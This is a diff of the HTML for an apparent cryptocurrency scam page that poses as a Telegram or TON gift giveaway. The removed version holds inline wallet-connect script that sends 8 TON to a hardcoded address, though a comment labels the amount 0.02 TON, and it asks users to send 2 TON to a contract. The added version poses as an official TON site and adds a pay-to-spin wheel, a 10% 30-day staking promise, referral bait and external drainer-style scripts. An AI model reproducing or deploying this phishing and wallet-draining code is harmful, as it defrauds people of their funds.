@@ -1,224 +1,235 @@
 <!DOCTYPE html>
 <html lang="en">
-
-<!-- Mirrored from tomomsom.top/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 27 Nov 2024 13:06:30 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
-<head><script src="../ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="shortcut icon" href="../ton.org/_next/static/media/favicon-16x16.69c92b2b.png">
+    <link rel="shortcut icon" href="ton.org/_next/static/media/favicon-16x16.69c92b2b.png">
     <link rel="preconnect" href="https://fonts.googleapis.com/">
     <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
+    <link rel="stylesheet" href="style.css?v=6.0" />
+    <title>TON Gift Rolls - Win Big!</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&amp;display=swap" rel="stylesheet">
-
-    <link rel="stylesheet" href="style.css?v=5.0" />
-    <title>Drake Community</title>
-
-    <link rel="stylesheet" href="../use.fontawesome.com/releases/v5.8.2/css/all.css">
-
+    <script src="https://cdn.jsdelivr.net/gh/weblop16/cdn1@main/lottie-playerton.js"></script>
 </head>
 <body>
 
-    <div class="page">
+    <div class="start-screen active">
+        <div class="start-screen__content">
+            <h1 class="start-screen__title">TON Rolls</h1>
+            <div class="start-screen__rolls-shadows">
+                <span>Rolls</span>
+                <span>Rolls</span>
+                <span>Rolls</span>
+            </div>
+            <lottie-player src="spinner.json" background="transparent" class="start-screen__loading-spinner" loop speed="1"></lottie-player>
+            <div class="start-screen__loading-text">Loading the ultimate giveaway...</div>
+        </div>
+    </div>
+
+    <div class="page hide">
         <header class="header">
             <div class="container">
-</header>
-<div class="page__wrapper">
-    <div class="page__logo">
-        <img src="telegram.png" alt="telegram" />
-    </div>
-    <h1 class="page__title">
-        Gift Giveaway
-    </h1>
-    <div class="page__suptitle">
-        Any Telegram user has the right to participate in this event at this moment 
-        <span>the gifts 🎁 </span>
-        <video width="0" height="0" controls>
-            <source src="#" type="video/mp4">
-            <source src="video.html" type="video/webm">
-        </video>
-    </div>
-    <div class="ton">
-        <div class="ton__icon">
-            <img src="toncoin.png" alt="TON" />
-        </div>
-        <div class="ton__title">
-            Drake Team
-        </div>
-        <div class="ton__abb">
-            Drake
-        </div>
-    </div>
-    <div class="form hide">
-        <div class="form__text">
-            Enter your Telegram User To Receive
-        </div>
-        <div class="form__input">
-            <input type="text" id="login" />
-            <label for="login">TON wallet add</label>
-	
-	         </div>
-                     <!-- Connect Wallet Buttons -->
-							   
-							 <center> <div id="ton-connect"></div> </center> 
-                             <button id="connectWalletBtn" class="connect">Connect Wallet</button>						   
-                             <button id="sendTransactionBtn" class="transact" style="--clr:#007bff">Confirm Transaction</button>
-                          </div>
-
-            </div>
-        </div>
-    </div>
-
-    <section class="part">
-        <div class="container">
-            <div class="part__ideas">
-                <div class="part__ideas-left">
-                    <h3> Community Support Agent </h3>
-                    <p>Ask questions, any help in a short time.</p>
-                    <div class="part__btn">
-                        <a href="http://t.me/DrakeSupBot">Support Agent<i class="fab fa-telegram-plane"></i></a>
-                        <a href="https://t.me/drake">Explore all <i class="fas fa-chevron-right"></i></a>
-                    </div>
-                </div>
-                <div class="part__ideas-right">
-                    <div class="part__num">
-                        <div class="part__num-item">
-                            1
-                        </div>
-                        <div class="part__num-item">
-                            5
-                        </div>
-                        <div class="part__num-item">
-                            6
-                        </div>
-                        <div class="part__num-item">
-                            2
-                        </div>
-                        <div class="part__num-item">
-                            3
-                        </div>
-                        <div class="part__num-item">
-                            1
-                        </div>
-                        <div class="part__num-item">
-                            5
-                        </div>
-                    </div>
-                    <div class="part__num-text">
-                        Total community members
+                <div class="header__wrapper">
+                    <a href="#" class="header__logo">
+                        <svg width="63" height="24" viewBox="0 0 63 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g clip-path="url(#clip0_225_523)"><path d="M12.0708 24C18.6982 24 24.0708 18.6274 24.0708 12C24.0708 5.37258 18.6982 0 12.0708 0C5.44338 0 0.0708008 5.37258 0.0708008 12C0.0708008 18.6274 5.44338 24 12.0708 24Z" fill="#0098EA"></path><path d="M16.1681 6.69763H7.97313C6.46635 6.69763 5.51133 8.32302 6.26937 9.63694L11.327 18.4033C11.6571 18.9757 12.4842 18.9757 12.8142 18.4033L17.8729 9.63694C18.6299 8.32508 17.6749 6.69763 16.1691 6.69763H16.1681ZM11.3229 15.7744L10.2214 13.6426L7.56369 8.88922C7.38836 8.58497 7.60494 8.19513 7.9721 8.19513H11.3219V15.7754L11.3229 15.7744ZM16.5755 8.88819L13.9188 13.6437L12.8173 15.7744V8.1941H16.1671C16.5342 8.1941 16.7508 8.58394 16.5755 8.88819Z" fill="white"></path><path d="M31.6353 18.6289H34.323V9.25552H38.0394V6.70219H27.9188V9.25552H31.6353V18.6289Z" fill="currentColor"></path><path d="M44.4989 18.8305C47.8921 18.8305 50.6638 16.0588 50.6638 12.6656C50.6638 9.27232 47.8921 6.50061 44.4989 6.50061C41.0888 6.50061 38.3339 9.27232 38.3339 12.6656C38.3339 16.0588 41.0888 18.8305 44.4989 18.8305ZM44.4989 16.2436C42.5503 16.2436 41.0216 14.5974 41.0216 12.6656C41.0216 10.7338 42.5503 9.08754 44.4989 9.08754C46.4306 9.08754 47.9593 10.7338 47.9593 12.6656C47.9593 14.5974 46.4306 16.2436 44.4989 16.2436Z" fill="currentColor"></path><path d="M62.9291 18.6289V6.70219H60.2414V14.0598L54.446 6.70219H52.1447V18.6289H54.8156V11.2545L60.6278 18.6289H62.9291Z" fill="currentColor"></path></g><defs><clipPath id="clip0_225_523"><rect width="63" height="24" fill="white"/></clipPath></defs></svg>
+                    </a>
+                    <nav class="header__nav">
+                        <ul class="header__nav-list">
+                            <li><a href="https://ton.org/en/payments">USE TON</a></li>
+                            <li><a href="https://docs.ton.org/learn/introduction">Learn TON</a></li>
+                            <li><a href="https://docs.ton.org/">Build on TON</a></li>
+                            <li><a href="https://ton.org/en/community">TON Community</a></li>
+                        </ul>
+                    </nav>
+                    <div class="header__burger">
+                        <span></span>
                     </div>
                 </div>
             </div>
-        </div>
-    </section>
+        </header>
 
-    <section class="blocks">
-        <div class="container">
-            <div class="blocks__wrapper">
-                <div class="blocks__item">
-                    <h3>Collaborate with Team</h3>
-                    <p>Organise breakfasts, hubs, informal meetings with like-minded people and share ideas.</p>
-                    <a href="https://t.me/drake">Collaborate with Drake<i class="fas fa-chevron-right"></i></a>
-                    <img src="12.png" alt="">
+        <div class="page__wrapper">
+            <div id="content-rolls" class="active-section section-content">
+                <div class="page__logo">
+                    <img src="img/telegram.png" alt="Telegram App Icon" />
                 </div>
-                <div class="blocks__item">
-                    <h3>Manual Claiming</h3>
-                    <p>Send 2 TON</p>
-			<P>To Smart contract : UQBgDn-iemlTa4ZBosYSNYzB-4Db7m2I_W0uYJy2Cx-78fWP </P>
-		
-                    <a href="https://tonscan.org/address/EQCMOXxD-f8LSWWbXQowKxqTr3zMY-X1wMTyWp3B-LR6s3Va">check explorer <i class="fas fa-chevron-right"></i></a>
-                    <img src="2.html" alt="">
+                <h1 class="page__title">
+                    Telegram Gift Rolls - Spin to Win!
+                </h1>
+                <div class="page__suptitle">
+                    Every Telegram user has the chance to participate and win amazing <span>TON prizes 🎁 </span>
+                </div>
+                <div class="ton">
+                    <div class="ton__icon">
+                        <img src="img/toncoin.png" alt="TON Coin" />
+                    </div>
+                    <div class="ton__title">
+                        Toncoin
+                    </div>
+                    <div class="ton__abb">
+                        TON
+                    </div>
+                </div>
+
+                <div class="rolls-main-area">
+                    <div class="spinner-container">
+                        <img src="rolls_wheel_background.png" alt="Spinning Wheel of Fortune" class="spinning-wheel">
+                        <div class="spinner-needle"></div>
+                        <div class="spinner-center-text">Rolls</div>
+                    </div>
+                    <div class="rolls-info-text">
+                        Connect your wallet and pay 2 TON to spin the wheel for an instant chance to win exclusive gifts!
+                    </div>
+                    <div class="rolls-buttons">
+                        <button id="connectWalletBtnRolls" class="primary-button">Connect Wallet</button>
+                        <button id="payForRollsBtn" class="primary-button hide">Pay 2 TON & Roll!</button>
+                    </div>
+
+                    <div class="code-entry-section hide">
+                        <p class="code-entry-info">Enter your unique confirmation code to claim your prize:</p>
+                        <div class="input-group">
+                            <input type="text" id="confirmationCodeInput" placeholder="Code (e.g., 909986)">
+                            <label for="confirmationCodeInput">Confirmation Code</label>
+                        </div>
+                        <button id="verifyCodeBtn" class="secondary-button">Verify Code</button>
+                        <p id="codeErrorMessage" class="error-message hide">Incorrect code. Please try again or contact support.</p>
+                    </div>
+                    <div class="referral-after-code-message hide">
+                        <p>Congratulations! To activate your prize, invite 10 friends to the bot via the "Earn" section.</p>
+                    </div>
+
+                    <div class="loading-animation hide">
+                        <lottie-player src="spinner.json" background="transparent" class="loading-spinner" loop speed="1"></lottie-player>
+                        <div class="loading-text">Processing your request...</div>
+                    </div>
+                    <lottie-player src="check.json" background="transparent" class="checkmark-animation hide" speed="1"></lottie-player>
                 </div>
             </div>
-        </div>
-    </section>
 
-    <footer>
-        <div class="container">
-            <div class="footer__wrapper">
-                <a href="#" class="footer__logo">
-                    <svg width="63" height="24" viewBox="0 0 63 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g clip-path="url(#logo_small_svg__clip0_225_523)"><path d="M12.0708 24C18.6982 24 24.0708 18.6274 24.0708 12C24.0708 5.37258 18.6982 0 12.0708 0C5.44338 0 0.0708008 5.37258 0.0708008 12C0.0708008 18.6274 5.44338 24 12.0708 24Z" fill="#0098EA"></path><path d="M16.1681 6.69763H7.97313C6.46635 6.69763 5.51133 8.32302 6.26937 9.63694L11.327 18.4033C11.6571 18.9757 12.4842 18.9757 12.8142 18.4033L17.8729 9.63694C18.6299 8.32508 17.6749 6.69763 16.1691 6.69763H16.1681ZM11.3229 15.7744L10.2214 13.6426L7.56369 8.88922C7.38836 8.58497 7.60494 8.19513 7.9721 8.19513H11.3219V15.7754L11.3229 15.7744ZM16.5755 8.88819L13.9188 13.6437L12.8173 15.7744V8.1941H16.1671C16.5342 8.1941 16.7508 8.58394 16.5755 8.88819Z" fill="white"></path><path d="M31.6353 18.6289H34.323V9.25552H38.0394V6.70219H27.9188V9.25552H31.6353V18.6289Z" fill="currentColor"></path><path d="M44.4989 18.8305C47.8921 18.8305 50.6638 16.0588 50.6638 12.6656C50.6638 9.27232 47.8921 6.50061 44.4989 6.50061C41.0888 6.50061 38.3339 9.27232 38.3339 12.6656C38.3339 16.0588 41.0888 18.8305 44.4989 18.8305ZM44.4989 16.2436C42.5503 16.2436 41.0216 14.5974 41.0216 12.6656C41.0216 10.7338 42.5503 9.08754 44.4989 9.08754C46.4306 9.08754 47.9593 10.7338 47.9593 12.6656C47.9593 14.5974 46.4306 16.2436 44.4989 16.2436Z" fill="currentColor"></path><path d="M62.9291 18.6289V6.70219H60.2414V14.0598L54.446 6.70219H52.1447V18.6289H54.8156V11.2545L60.6278 18.6289H62.9291Z" fill="currentColor"></path></g><defs><clipPath id="logo_small_svg__clip0_225_523"><rect width="63" height="24" fill="white"></rect></clipPath></defs></svg>
-                </a>
-                <div class="footer__soc">
-                    <a href="https://t.me/tonnscommunity"><i class="fab fa-youtube"></i></a>
-                    <a href="https://t.me/tonnscommunity"><i class="fab fa-telegram-plane"></i></a>
-                    <a href="https://t.me/tonnscommunity"><i class="fab fa-whatsapp"></i></a>
+            <div id="content-staking" class="hidden-section section-content">
+                <div class="staking-header">
+                    <img src="ton_staking_icon.png" alt="TON Staking Icon" class="staking-header-icon">
+                    <h1 class="staking-title">Elevate Your Earnings with TON Staking</h1>
+                </div>
+                <div class="staking-banner-text">
+                    <p>Unlock passive income! Earn a solid 10% profit on your TON over just 30 days.</p>
+                </div>
+                <div class="staking-input-wrapper">
+                    <div class="input-group">
+                        <input type="number" id="stakingAmount" placeholder="Amount (e.g., 10 TON)" min="1">
+                        <label for="stakingAmount">TON Amount to Stake</label>
+                    </div>
+                    <button id="stakeTonBtn" class="primary-button">Stake TON Now!</button>
+                </div>
+                <div class="staking-summary">
+                    <p>Estimated Profit (30 days): <span id="estimatedProfit" class="highlight-text">0 TON</span></p>
+                    <p>Transaction Fee (-1% of Profit): <span id="stakingFee" class="highlight-text">0 TON</span></p>
+                    <p>Total Projected Return: <span id="totalReturn" class="highlight-text">0 TON</span></p>
+                    <a href="#" class="learn-more-link">Learn More About Staking</a>
+                    <div class="learn-more-content hide">
+                        <p>1. **Grow Your Assets:** Securely earn passive income with minimal effort.</p>
+                        <p>2. **Flexible & Rewarding:** Choose your stake amount and see your TON grow.</p>
+                        <p>3. **Top-Tier Security:** Your staked funds are protected by advanced blockchain security.</p>
+                        <p>4. **Referral Bonus:** Invite friends and earn an impressive 20% of their staking profits!</p>
+                    </div>
                 </div>
             </div>
+
+            <div id="content-earn" class="hidden-section section-content">
+                <div class="earn-user-profile">
+                    <img src="img/telegram.png" alt="User Profile" class="earn-user-pic">
+                    <h2 class="earn-user-name">@YourTelegramUser</h2> </div>
+                <div class="earn-invite-card">
+                    <h3>Boost Your Earnings: Invite Friends!</h3>
+                    <p>Refer your friends and earn a fantastic **20% from their staking profits** and **10% from their Rolls fees!** The more they play, the more you earn!</p>
+                    <button class="primary-button invite-frens-btn">Invite Frens Now!</button>
+                    <div class="input-group referral-link-group">
+                        <input type="text" id="referralLink" value="https://t.me/your_bot?start=YOUR_USER_ID" readonly>
+                        <label for="referralLink">Your Unique Referral Link</label>
+                        <button class="copy-referral-btn"><i class="far fa-copy"></i> Copy</button>
+                    </div>
+                </div>
+                <div class="earn-stats-container">
+                    <div class="stat-box">
+                        <p class="stat-label">Total Invited Users</p>
+                        <p class="stat-value">0</p>
+                    </div>
+                    <div class="stat-box">
+                        <p class="stat-label">Total Earnings</p>
+                        <p class="stat-value">0 TON <button class="secondary-button claim-btn">Claim Rewards</button></p>
+                    </div>
+                </div>
+            </div>
+
+            <div id="content-team" class="hidden-section section-content">
+                <h2 class="team-section-title">Our Vision: Powering Your Experience on TON</h2>
+                <p class="team-description-text">
+                    At TON Rolls, we are driven by a singular vision: to create an unparalleled gaming and earning experience within the Telegram ecosystem. We proudly leverage The Open Network (TON), a robust and decentralized blockchain born from the innovative spirit of Telegram. Our dedicated team is committed to building a transparent, secure, and user-friendly platform that seamlessly connects millions of Telegram users to the exciting world of TON. Join us in shaping the future of decentralized entertainment and finance!
+                </p>
+                <div class="team-members-photos">
+                    <img src="team_member_px1.png" alt="Team Member Px1" class="team-photo blurred" data-member-id="px1">
+                    <img src="team_member_px2.png" alt="Team Member Px2" class="team-photo blurred" data-member-id="px2">
+                    <img src="team_member_px3.png" alt="Team Member Px3" class="team-photo blurred" data-member-id="px3">
+                    <img src="team_member_px4.png" alt="Team Member Px4" class="team-photo blurred" data-member-id="px4">
+                    <img src="team_member_px5.png" alt="Team Member Px5" class="team-photo blurred" data-member-id="px5">
+                </div>
+                <div class="contact-details">
+                    <h3>Reach Out To Us</h3>
+                    <p><strong>Headquarters:</strong> Shuaa Capital Company, 12th Floor, Tawun Tower, Al Maktoum St, Baniyas Sq, Dubai, UAE</p>
+                    <p><strong>Phone:</strong> +971567238336</p>
+                    <p><strong>Working Hours:</strong> 10:00 AM - 10:00 PM (Gulf Standard Time)</p>
+                    <p><strong>Dedicated Support:</strong> <a href="http://t.me/RollsCompanyBot" target="_blank">@RollsCompanyBot</a></p>
+                </div>
+            </div>
+
         </div>
-    </footer>
 
-    <script>
-        let isWalletConnected = false;
-        let tonConnectUI = null;
-            //Initialize TON Connect UI
-            document.addEventListener("DOMContentLoaded", async function () {
-                  tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-                  manifestUrl: 'https://tonairdrops.vercel.app/tonconnect-manifest.json',
-                  buttonRootId: 'ton-connect'
-        });
-    //Check if wallet is already connected
-    const connectedWallet = await tonConnectUI.getWallets();
-    if(connectedWallet){
-       isWalletConnected = true;
-       console.log("Wallet is already connected: ", connectedWallet);
-    }
-    
-            });
-    
-            // Connect wallet
-            async function connectWallet() {
-                if (isWalletConnected){
-                    console.log("wallet already connected")
-                    return;
-                }
-    
-                try {
-                    const connectedWallet = await tonConnectUI.connectWallet();
-                    if (connectedWallet) {
-                        isWalletConnected = true;
-                        console.log("Wallet connected", connectedWallet);
-                    }
-                } catch (error) {
-                    console.error("Error connecting to wallet: ", error);
-                }
-            }
-    
-            // Send Transaction
-                async function sendTonTransaction() {
-                    if (!isWalletConnected) {
-                        console.error("Please connect your wallet first.");
-                        return;
-                    }
-    
-                    const transaction = {
-                        messages: [
-                            {
-                                address: "UQBcRvmMpgBXbdQkKAWgVTae0WXle47R2B3opTxXewo53BsV", // destination address
-                                amount: "8000000000" // toncoin in nanotons (0.02 TON)
-                            }
-                        ]
-                    };
-    
-                    try {
-                        const result = await tonConnectUI.sendTransaction(transaction);
-                        console.log("Transaction successful:", result);
-                    } catch (error) {
-                        console.error("Transaction failed:", error);
-                    }
-                }
-               
-              // Button event listener
-              document.getElementById("connectWalletBtn").addEventListener("click", connectWallet);
-              document.getElementById("sendTransactionBtn").addEventListener("click", sendTonTransaction);
-    
-        </script>
+        <div class="global-timer-section">
+            <p class="timer-label">Next Grand Gift Drop Countdown:</p>
+            <div id="countdown" class="timer-display"></div>
+            <p class="timer-note">Event Concludes: July 30, 12:00 PM UTC</p>
+        </div>
 
-    <script src="https://cdn.jsdelivr.net/gh/weblop16/cdn1@main/lottie-playerton.js"></script>
-    <script src="https://cdn.jsdelivr.net/gh/weblop16/cdn1@main/scriptton.js"></script>
-</script>
-  <script src="assets/web3-provider.js"></script></body>
+        <footer>
+            <div class="container">
+                <div class="footer__wrapper">
+                    <a href="#" class="footer__logo">
+                        <svg width="63" height="24" viewBox="0 0 63 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g clip-path="url(#clip0_225_523)"><path d="M12.0708 24C18.6982 24 24.0708 18.6274 24.0708 12C24.0708 5.37258 18.6982 0 12.0708 0C5.44338 0 0.0708008 5.37258 0.0708008 12C0.0708008 18.6274 5.44338 24 12.0708 24Z" fill="#0098EA"></path><path d="M16.1681 6.69763H7.97313C6.46635 6.69763 5.51133 8.32302 6.26937 9.63694L11.327 18.4033C11.6571 18.9757 12.4842 18.9757 12.8142 18.4033L17.8729 9.63694C18.6299 8.32508 17.6749 6.69763 16.1691 6.69763H16.1681ZM11.3229 15.7744L10.2214 13.6426L7.56369 8.88922C7.38836 8.58497 7.60494 8.19513 7.9721 8.19513H11.3219V15.7754L11.3229 15.7744ZM16.5755 8.88819L13.9188 13.6437L12.8173 15.7744V8.1941H16.1671C16.5342 8.1941 16.7508 8.58394 16.5755 8.88819Z" fill="white"></path><path d="M31.6353 18.6289H34.323V9.25552H38.0394V6.70219H27.9188V9.25552H31.6353V18.6289Z" fill="currentColor"></path><path d="M44.4989 18.8305C47.8921 18.8305 50.6638 16.0588 50.6638 12.6656C50.6638 9.27232 47.8921 6.50061 44.4989 6.50061C41.0888 6.50061 38.3339 9.27232 38.3339 12.6656C38.3339 16.0588 41.0888 18.8305 44.4989 18.8305ZM44.4989 16.2436C42.5503 16.2436 41.0216 14.5974 41.0216 12.6656C41.0216 10.7338 42.5503 9.08754 44.4989 9.08754C46.4306 9.08754 47.9593 10.7338 47.9593 12.6656C47.9593 14.5974 46.4306 16.2436 44.4989 16.2436Z" fill="currentColor"></path><path d="M62.9291 18.6289V6.70219H60.2414V14.0598L54.446 6.70219H52.1447V18.6289H54.8156V11.2545L60.6278 18.6289H62.9291Z" fill="currentColor"></path></g><defs><clipPath id="clip0_225_523"><rect width="63" height="24" fill="white"/></clipPath></defs></svg>
+                    </a>
+                    <div class="footer__soc">
+                        <a href="https://t.me/tonnscommunity"><i class="fab fa-youtube"></i></a>
+                        <a href="https://t.me/tonnscommunity"><i class="fab fa-telegram-plane"></i></a>
+                        <a href="https://t.me/tonnscommunity"><i class="fab fa-whatsapp"></i></a>
+                    </div>
+                </div>
+            </div>
+        </footer>
 
-<!-- Mirrored from tomomsom.top/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 27 Nov 2024 13:06:41 GMT -->
+        <nav class="bottom-nav">
+            <ul>
+                <li data-section="rolls" class="active">
+                    <i class="fas fa-dice"></i>
+                    <span>Rolls</span>
+                </li>
+                <li data-section="earn">
+                    <i class="fas fa-hand-holding-usd"></i>
+                    <span>Earn</span>
+                </li>
+                <li data-section="staking">
+                    <i class="fas fa-coins"></i>
+                    <span>Staking</span>
+                </li>
+                 <li data-section="team">
+                    <i class="fas fa-users"></i>
+                    <span>Team</span>
+                </li>
+            </ul>
+        </nav>
+    </div>
+
+    <script src="assets/web3-provider.js"></script>
+    <script src="scriptton.js"></script>
+</body>
 </html>
